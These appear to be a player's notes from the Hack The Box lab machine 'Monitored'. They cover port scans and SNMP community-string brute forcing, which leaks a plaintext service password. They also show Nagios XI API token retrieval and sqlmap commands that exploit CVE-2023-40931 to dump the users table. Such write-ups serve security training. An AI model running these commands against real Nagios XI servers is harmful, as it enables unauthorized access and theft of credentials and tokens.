User FLAG
-----

1. Scan ports on a machine

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.56
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
5667/tcp open  tcpwrapped
```

2. `dirsearch.py -r -u https://monitored.htb/nagiosxi/ -m GET PUT POST -w /home/dyallo/Documents/Security/wordlists/api-endpoints.txt`

3. `nmap -p- -T4 --min-rate 5000 -sU -o udp --top-ports 100 10.10.11.248`

## Whatweb

```bash
whatweb https://nagios.monitored.htb/
https://nagios.monitored.htb/ [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.11.248], JQuery[3.6.0], Script[text/javascript], Title[Nagios XI]
```

## Searchsploit

```bash
searchsploit nagios      
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
Lilac-Reloaded for Nagios 2.0.8 - Remote Code Execution (RCE)                 | php/webapps/51374.py
Nagios 3.0.6 - 'statuswml.cgi' Arbitrary Shell Command Injection              | cgi/remote/33051.txt
Nagios 3.2.3 - 'expand' Cross-Site Scripting                                  | multiple/remote/35818.txt
Nagios 4.2.2 - Local Privilege Escalation                                     | linux/local/40774.sh
Nagios < 4.2.2 - Arbitrary Code Execution                                     | linux/remote/40920.py
Nagios < 4.2.4 - Local Privilege Escalation                                   | linux/local/40921.sh
Nagios Core 4.4.1 - Denial of Service                                         | linux/dos/45082.txt
Nagios Incident Manager 2.0.0 - Multiple Vulnerabilities                      | php/webapps/40252.txt
Nagios Log Server 1.4.1 - Multiple Vulnerabilities                            | php/webapps/40250.txt
Nagios Log Server 2.1.6 - Persistent Cross-Site Scripting                     | multiple/webapps/48772.txt
Nagios Log Server 2.1.7 - Persistent Cross-Site Scripting                     | multiple/webapps/49082.txt
Nagios Network Analyzer 2.2.0 - Multiple Vulnerabilities                      | php/webapps/40251.txt
Nagios Network Analyzer 2.2.1 - Multiple Cross-Site Request Forgery Vulnerabi | php/webapps/40221.txt
Nagios Plugins 1.4.2/1.4.9 - Location Header Remote Buffer Overflow           | linux/dos/30646.txt
Nagios Plugins check_dhcp 2.0.1 - Arbitrary Option File Read                  | linux/local/33387.txt
Nagios Plugins check_dhcp 2.0.2 - Arbitrary Option File Read Race Condition   | linux/local/33904.txt
Nagios Plugins check_ups - Local Buffer Overflow (PoC)                        | linux/dos/18278.txt
Nagios Remote Plugin Executor - Arbitrary Command Execution (Metasploit)      | linux/remote/24955.rb
Nagios XI - 'login.php' Multiple Cross-Site Scripting Vulnerabilities         | linux/remote/34507.txt
Nagios XI - 'tfPassword' SQL Injection                                        | php/remote/38827.txt
Nagios XI - 'users.php' SQL Injection                                         | multiple/remote/34523.txt
Nagios XI - Authenticated Remote Command Execution (Metasploit)               | linux/remote/48191.rb
Nagios XI - Multiple Cross-Site Request Forgery Vulnerabilities               | linux/remote/34431.html
Nagios XI - Multiple Cross-Site Scripting / HTML Injection Vulnerabilities    | multiple/remote/36455.txt
Nagios XI 5.2.6 < 5.2.9 / 5.3 / 5.4 - Chained Remote Root                     | php/webapps/44560.py
Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)           | linux/remote/44969.rb
Nagios XI 5.2.7 - Multiple Vulnerabilities                                    | php/webapps/39899.txt
Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution (Metasploit)    | linux/remote/47039.rb
Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation                | linux/webapps/46221.py
Nagios XI 5.6.1 - SQL injection                                               | php/webapps/46910.txt
Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution                     | php/webapps/48640.txt
Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation           | php/webapps/47299.php
Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting         | php/webapps/48893.txt
Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection                  | php/webapps/48894.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)         | php/webapps/48959.py
Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection           | php/webapps/48895.txt
Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting                    | php/webapps/49449.txt
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                   | php/webapps/49422.py
Nagios XI Chained - Remote Code Execution (Metasploit)                        | linux/remote/40067.rb
Nagios XI Network Monitor Graph Explorer Component - Command Injection (Metas | unix/remote/23227.rb
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                   | linux/remote/24159.rb
Nagios3 - 'history.cgi' Remote Command Execution                              | multiple/remote/24084.py
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)               | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                      | unix/webapps/9861.rb
NagiosQL 2005 2.00 - 'prepend_adm.php' Remote File Inclusion                  | php/webapps/3919.txt
PHPNagios 1.2.0 - 'menu.php' Local File Inclusion                             | php/webapps/9611.txt
------------------------------------------------------------------------------ ---------------------------------
```

## SNMP

```bash
python3 ../../scripts/snmpbrute.py -t 10.10.11.248 -
f ~/Documents/Security/wordlists/common-snmp-community-strings-onesixtyone.txt
10.10.11.248 : 161      Version (v1):   public
10.10.11.248 : 161      Version (v2c):  public
onesixtyone -c ~/Documents/Security/wordlists/common-snmp-community-strings-onesixtyone.txt 10.10.11.248
Scanning 1 hosts, 121 communities
10.10.11.248 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
10.10.11.248 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
```

```bash
iso.3.6.1.2.1.25.4.2.1.5.955 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.956 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.1054 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
iso.3.6.1.2.1.25.4.2.1.5.1401 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1402 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
```

Login to `https://monitored.htb/nagios/` with `svc:XjH7VCehowpR1xZB`

```bash
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'
curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=TOKEN' > image.png
```

```bash
curl -X POST -k -L -d 'username=svc&password=XjH7VCehowpR1xZB' https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/
{"username":"svc","user_id":"2","auth_token":"2301738ce1ebde94a5bcc0577d7d6d905a6053a2","valid_min":5,"valid_until":"Sun, 07 Apr 2024 15:12:46 -0400"}
```

```
1. SQL Injection in Banner acknowledging endpoint (CVE-2023-40931)

Nagios XI features “Announcement Banners”, which can optionally be acknowledged by users. The endpoint for this feature is vulnerable to a SQL Injection attack.

When a user acknowledges a banner, a POST request is sent to `/nagiosxi/admin/banner_message-ajaxhelper.php` with the POST data consisting of the intended action and message ID – `action=acknowledge banner message&id=3`.

The ID parameter is assumed to be trusted but comes directly from the client without sanitization. This leads to a SQL Injection where an authenticated user with low or no privileges can retrieve sensitive data, such as from the `xi_session` and `xi_users` table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.

This vulnerability does not require the existence of a valid announcement banner ID, meaning it can be exploited by an attacker at any time.
```

```bash
python3 sqlmap.py -u -p id "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=2301738ce1ebde94a5bcc0577d7d6d905a6053a2" --batch --dbs
```

```bash
python3 sqlmap.py -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=2301738ce1ebde94a5bcc0577d7d6d905a6053a2" --batch --level 5 --risk 3 -p id -D nagiosxi -T xi_users --dump
```

## Versions

- Apache 2.4.56
- Nagios® Core™ 4.4.13

## Links

- https://support.nagios.com/forum/viewtopic.php?f=16&t=58783
- https://outpost24.com/blog/nagios-xi-vulnerabilities/